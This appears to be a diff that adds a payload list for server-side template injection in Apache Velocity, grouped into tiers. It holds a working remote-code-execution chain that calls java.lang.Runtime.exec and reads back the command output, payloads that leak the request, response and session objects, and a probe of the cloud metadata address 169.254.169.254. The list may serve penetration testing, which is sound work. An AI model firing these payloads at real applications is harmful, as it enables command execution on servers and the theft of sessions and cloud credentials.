@@ -1,0 +1,27 @@
+# Apache Velocity SSTI — Advanced payload tier
+# ── Confirm ─────────────────────────────────────────────────────────────────
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
+#set($str=$class.inspect("java.lang.String").type)
+# ── Advanced — RCE chain ───────────────────────────────────────────────────
+#set($rt=$class.inspect("java.lang.Runtime").type)#set($proc=$rt.getRuntime().exec("id"))#set($is=$proc.getInputStream())#set($reader=$class.inspect("java.io.InputStreamReader").type.init($is))#set($br=$class.inspect("java.io.BufferedReader").type.init($reader))$br.readLine()
+#set($chr=$class.inspect("java.lang.Character").type)
+# ── Advanced — context leak ────────────────────────────────────────────────
+$context
+$velocityContext
+$request
+$response
+$session
+# ── Advanced — math/string ─────────────────────────────────────────────────
+#set($a=1+1)$a
+#set($s='hello world')$s.length()
+#set($s='hello world')$s.toUpperCase()
+# ── Advanced — arithmetic ──────────────────────────────────────────────────
+$math.abs(-1)
+$math.max(1,2)
+# ── Advanced — directive ───────────────────────────────────────────────────
+#if(1==1)SSTI_CONFIRMED#end
+#if(1==2)NO#else SSTI_CONFIRMED#end
+#foreach($i in [1,2,3])$i#end
+# ── Advanced — tool access ─────────────────────────────────────────────────
+$dateTool.date
+$display.url('http://169.254.169.254/')
